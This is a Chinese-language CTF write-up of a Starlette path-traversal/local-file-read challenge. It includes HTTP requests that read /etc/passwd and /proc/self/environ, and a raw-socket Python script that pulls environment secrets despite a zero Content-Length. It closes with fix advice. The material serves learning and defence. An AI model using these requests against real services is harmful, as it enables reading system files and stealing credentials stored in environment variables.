# Funny lfr

## 题目简述

服务只有一个 Starlette 路由，把查询参数 `file` 原样交给 `FileResponse`：

```python
async def download(request):
    return FileResponse(request.query_params.get("file"))
```

没有路径白名单、固定根目录或规范化后的边界检查，因此这是直接的任意本地文件读取。容器把 flag 放在 Uvicorn 进程继承的 `FLAG` 环境变量中，目标文件为 `/proc/self/environ`。

## 解题过程

先验证普通文件读取：

```http
GET /?file=/etc/passwd HTTP/1.1
Host: target
Connection: close
```

`FileResponse` 会按攻击者给出的绝对路径打开文件，响应中可以看到 `/etc/passwd`，确认没有目录限制。接着请求：

```http
GET /?file=/proc/self/environ HTTP/1.1
Host: target
Connection: close
```

`/proc/self/environ` 以 NUL 分隔形式保存当前进程初始环境，其中包含：

```text
...\x00HOSTNAME=...\x00FLAG=SEKAI{...}\x00...
```

这里有一个容易被普通 HTTP 客户端掩盖的细节：procfs 伪文件的 `stat().st_size` 通常为 0，Starlette 可能据此生成 `Content-Length: 0`，但实际读取时仍能取得内容。一些高级客户端会严格相信长度头而不返回后续字节。官方脚本因此直接使用 TCP socket，持续读取到连接关闭，再手工取出响应头之后的原始数据：

```python
import socket
from urllib.parse import urlparse

def raw_get(url):
    u = urlparse(url)
    sock = socket.create_connection((u.hostname, u.port or 80))
    req = (
        f"GET {u.path or '/'}?{u.query} HTTP/1.1\r\n"
        f"Host: {u.hostname}\r\n"
        "Connection: close\r\n\r\n"
    )
    sock.sendall(req.encode())

    data = b""
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    sock.close()
    return data.split(b"\r\n\r\n", 1)[1]

body = raw_get("http://target:1337/?file=/proc/self/environ")
for item in body.split(b"\x00"):
    if item.startswith(b"FLAG="):
        print(item[5:].decode())
```

官方利用还并发重复请求 `/etc/passwd`、`/proc/self/environ` 和 `/proc/self/fd/20`。动态 fd 路径可以撞到应用临时打开的文件描述符，但在题目给出的容器配置中，直接读取进程环境已经足以获得 flag；并发不是漏洞成立的必要条件。

题面提供的 SSH 仅用于方便观察容器，和利用链无关。

## 方法总结

问题根源是把不可信路径直接传给通用文件响应组件。框架会负责分块、范围请求和响应头，但不会替应用决定哪些文件允许下载。攻击者可用绝对路径越过应用目录，读取 `/proc/self/environ` 中的 flag。

修复时应把用户输入限制为逻辑文件 ID，服务端映射到固定下载目录；即使接受相对路径，也必须先解析真实路径，再确认其仍位于允许根目录内。对 procfs 等零长度伪文件进行测试时，还应检查原始连接数据，避免被错误的 `Content-Length` 判断误导。
